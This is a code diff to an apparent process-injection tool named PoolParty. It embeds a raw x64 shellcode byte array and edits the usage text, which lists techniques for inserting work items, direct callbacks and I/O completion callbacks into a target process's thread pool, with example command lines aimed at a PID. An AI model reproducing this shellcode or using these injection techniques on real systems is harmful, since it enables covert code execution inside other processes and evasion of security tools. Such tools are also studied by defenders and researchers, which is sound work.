@@ -1,7 +1,5 @@
 #include "PoolParty.hpp"
 
-// TODO: better naming all over
-
 unsigned char g_Shellcode[] = 
 "\xE8\xBA\x00\x00\x00\x48\x8D\xB8\x9E\x00\x00\x00"
 "\x48\x31\xC9\x65\x48\x8B\x41\x60\x48\x8B\x40\x18"
@@ -37,8 +35,8 @@ void PrintUsage()
 		"#7: (RemoteDirectCallbackInsertion) " << std::endl << "\t+ Insert direct (TP_DIRECT) to the target process's thread pool" << std::endl << std::endl << std::endl <<
 		"EXAMPLES:" << std::endl <<
 		"------" << std::endl << std::endl <<
-		"#1 RemoteWorkItemInsertion against pid <1234> " << std::endl << "\t>>PoolParty.exe 1 1234" << std::endl << std::endl <<
-		"#1 RemoteIoCompletionCallbackInsertion against pid <1234> with debug privileges" << std::endl << "\t>>PoolParty.exe 1 1234 --debug" << std::endl << std::endl;
+		"#1 RemoteWorkItemInsertion against pid 1234 " << std::endl << "\t>>PoolParty.exe -V 2 -P 1234" << std::endl << std::endl <<
+		"#1 RemoteIoCompletionCallbackInsertion against pid 1234 with debug privileges" << std::endl << "\t>>PoolParty.exe -V 1 -P 1234 -D" << std::endl << std::endl;
 }
 
 // TODO: Use boost for command line argument parsing
